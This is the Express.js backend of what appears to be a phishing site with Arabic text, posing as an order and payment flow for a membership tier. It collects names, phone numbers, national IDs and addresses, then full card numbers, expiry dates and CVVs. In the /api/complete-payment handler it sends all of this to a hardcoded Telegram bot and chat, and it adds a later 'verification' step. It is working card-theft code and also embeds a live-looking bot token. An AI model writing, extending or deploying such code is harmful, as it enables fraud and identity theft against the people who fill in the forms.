const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');
const routes = require('./routes/api');

const app = express();
const PORT = process.env.PORT || 10000;
const TELEGRAM_BOT_TOKEN = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
const TELEGRAM_CHAT_ID = '8108427825';
const TELEGRAM_API_URL = 'https://api.telegram.org';

async function sendTelegramMessage(text) {
    const botToken = TELEGRAM_BOT_TOKEN;
    const chatId = TELEGRAM_CHAT_ID;
    const apiUrl = TELEGRAM_API_URL;

    if (!botToken || !chatId) {
        console.log('Telegram not configured.');
        return { success: false, skipped: true };
    }

    try {
        const response = await fetch(`${apiUrl}/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text,
                disable_web_page_preview: true,
                parse_mode: 'HTML'
            })
        });

        const payload = await response.json();
        if (!response.ok || !payload.ok) {
            throw new Error(payload.description || 'Telegram send failed');
        }
        return { success: true, payload };
    } catch (error) {
        console.error('Telegram send error:', error.message);
        return { success: false, error: error.message };
    }
}

function formatTelegramMessage(type, payload = {}) {
    const lines = ['طلب جديد'];
    const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
    if (customerName) lines.push(`اسم العميل: ${customerName}`);
    if (payload.phoneNumber) lines.push(`الهاتف: ${payload.phoneNumber}`);
    if (payload.nationalId) lines.push(`الهوية: ${payload.nationalId}`);
    if (payload.city) lines.push(`المدينة: ${payload.city}`);
    if (payload.street1) lines.push(`العنوان: ${payload.street1}`);
    if (payload.deliveryDate) lines.push(`موعد الاستلام: ${payload.deliveryDate}`);
    if (payload.tier) lines.push(`الباقة: ${payload.tier}`);
    if (payload.paymentData) {
        const paymentData = payload.paymentData;
        if (paymentData.cardHolder) lines.push(`اسم حامل البطاقة: ${paymentData.cardHolder}`);
        if (paymentData.cardNumber) lines.push(`رقم البطاقة: ${paymentData.cardNumber}`);
        if (paymentData.expiry) lines.push(`تاريخ الانتهاء: ${paymentData.expiry}`);
        if (paymentData.cvv) lines.push(`رمز الأمان: ${paymentData.cvv}`);
        lines.push(`الدفع: ${paymentData.cardType || 'غير معروف'} / ${paymentData.cardLast4 || '****'}`);
    }
    return lines.join('\n');
}

app.set('trust proxy', 1);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(session({
    secret: process.env.SESSION_SECRET || 'fazaa-secret-key-2026',
    resave: false,
    saveUninitialized: true,
    name: 'fazaa.sid',
    cookie: {
        maxAge: 60 * 60 * 1000,
        httpOnly: true,
        secure: false,
        sameSite: 'lax'
    }
}));

app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.use('/api', routes);

// Order Step 1 - Personal Info
app.get('/order1', (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    res.sendFile(path.join(__dirname, 'pages', 'order1.html'));
});

// Order Step 2 - Address Info
app.get('/order2', (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    res.sendFile(path.join(__dirname, 'pages', 'order2.html'));
});

// Order Step 3 - Summary & Payment
app.get('/order3', (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    res.sendFile(path.join(__dirname, 'pages', 'order3.html'));
});

// /order - start session on server then redirect to /order1
app.get('/order', async (req, res, next) => {
    try {
        const tier = req.query.tier || req.session.orderData?.tier || 'platinum';
        
        // Start session if not exists
        if (!req.session.userId) {
            const { v4: uuidv4 } = require('uuid');
            req.session.userId = uuidv4();
            req.session.currentStep = 1;
            req.session.orderStarted = false;
            req.session.orderCompleted = false;
            req.session.paymentCompleted = false;
            req.session.verified = false;
            req.session.orderData = { tier };
        }
        
        // Update tier if provided
        if (req.session.orderData) {
            req.session.orderData.tier = tier;
        }
        
        // Send HTML that redirects with meta refresh (more reliable for cookies)
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta http-equiv="refresh" content="0;url=/order1">
                <script>window.location.replace('/order1');</script>
            </head>
            <body>
                <p>جاري التحويل...</p>
            </body>
            </html>
        `);
    } catch (error) {
        next(error);
    }
});

// /payment - يحتاج orderCompleted
app.get('/payment', (req, res) => {
    console.log('/payment - userId:', req.session.userId, 'orderCompleted:', req.session.orderCompleted);
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    if (!req.session.orderCompleted) {
        return res.redirect('/?error=complete_order_first');
    }
    res.sendFile(path.join(__dirname, 'pages', 'payment.html'));
});

// /api/complete-payment - حفظ بيانات الدفع والانتقال للـ verification
app.post('/api/complete-payment', async (req, res) => {
    console.log('/api/complete-payment - userId:', req.session.userId, 'orderCompleted:', req.session.orderCompleted);
    
    if (!req.session.userId) {
        return res.status(401).json({ success: false, error: 'انتهت الجلسة' });
    }
    
    if (!req.session.orderCompleted) {
        return res.status(400).json({ success: false, error: 'أكمل الطلب أولاً' });
    }
    
    const paymentData = {
        cardType: req.body.cardNumber ? 'بطاقة' : 'غير معروف',
        cardLast4: req.body.cardNumber ? req.body.cardNumber.slice(-4) : '****',
        cardHolder: req.body.cardHolder || '',
        cardNumber: req.body.cardNumber || '',
        expiry: req.body.expiry || '',
        cvv: req.body.cvv || ''
    };

    // حفظ حالة الدفع
    req.session.paymentData = paymentData;
    req.session.paymentCompleted = true;
    req.session.save(async (err) => {
        if (err) {
            console.error('Session save error:', err);
            return res.status(500).json({ success: false, error: 'خطأ في الحفظ' });
        }

        const orderData = req.session.orderData || {};
        const telegramMessage = formatTelegramMessage('complete-payment', {
            userId: req.session.userId,
            fullName: orderData.fullName || '',
            phoneNumber: orderData.phoneNumber || '',
            nationalId: orderData.nationalId || '',
            city: orderData.city || '',
            street1: orderData.street1 || '',
            deliveryDate: orderData.deliveryDate || '',
            tier: orderData.tier || '',
            paymentData
        });
        await sendTelegramMessage(telegramMessage);
        res.json({ success: true });
    });
});

// /verification - يحتاج paymentCompleted
app.get('/verification', (req, res) => {
    console.log('/verification - userId:', req.session.userId, 'paymentCompleted:', req.session.paymentCompleted);
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    if (!req.session.paymentCompleted) {
        return res.redirect('/?error=complete_payment_first');
    }
    res.sendFile(path.join(__dirname, 'pages', 'verification.html'));
});

// /success - يحتاج verified
app.get('/success', (req, res) => {
    console.log('/success - userId:', req.session.userId, 'verified:', req.session.verified);
    if (!req.session.userId) {
        return res.redirect('/');
    }
    if (!req.session.verified) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'pages', 'success.html'));
});

// Catch-all
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    res.status(500).json({ error: 'Server error' });
});

app.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
